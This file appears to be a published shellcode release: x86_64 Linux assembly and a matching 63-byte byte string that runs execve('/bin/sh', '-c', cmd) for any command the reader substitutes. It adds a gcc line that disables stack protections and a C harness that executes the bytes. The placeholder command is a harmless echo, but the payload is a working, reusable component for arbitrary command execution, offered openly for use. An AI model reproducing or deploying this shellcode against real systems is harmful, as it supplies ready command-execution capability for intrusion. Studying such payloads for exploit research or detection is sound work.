/*
Title: Linux/x86_64 execve("/bin/sh",["-c",cmd],NULL) Arbitary Command Execution Shellcode (63 bytes)
Author: Muzaffer Umut ŞAHİN
Contact: mailatmayinlutfen@gmail.com
Date: 05.26.2025
Tested on Kali Linux/x86_64

--------------------------------------------------[CODE]--------------------------------------------------

global _start

_start:
 xor rax,rax
 xor rdx,rdx
 mov rdi,0x68732f6e69622f2f ; //bin/sh
 push rax
 push rdi
 mov rdi,rsp
 push rax
 push word 0x632d ; push "-c"
 mov rsi,rsp
 push rax
 jmp cmd
end:
 push rsi
 push rdi
 mov rsi,rsp
 mov al,59
 syscall
cmd:
 call end
 db "echo 'hell yeah!'" ; change this with your command

gcc -z execstack -fno-stack-protector -o main main.c
*/

#include <stdio.h>
#include <string.h>

int main() {
    unsigned char shellcode[] = "\x48\x31\xc0\x48\x31\xd2\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x50\x57\x48\x89\xe7\x50\x66\x68\x2d\x63\x48\x89\xe6\x50\xeb\x09\x56\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xf2\xff\xff\xff\x65\x63\x68\x6f\x20\x27\x68\x65\x6c\x6c\x20\x79\x65\x61\x68\x21\x27";
    printf("Size of the shellcode is %d bytes\n", strlen(shellcode));
    (*(void(*)())shellcode)();
    return 0;
}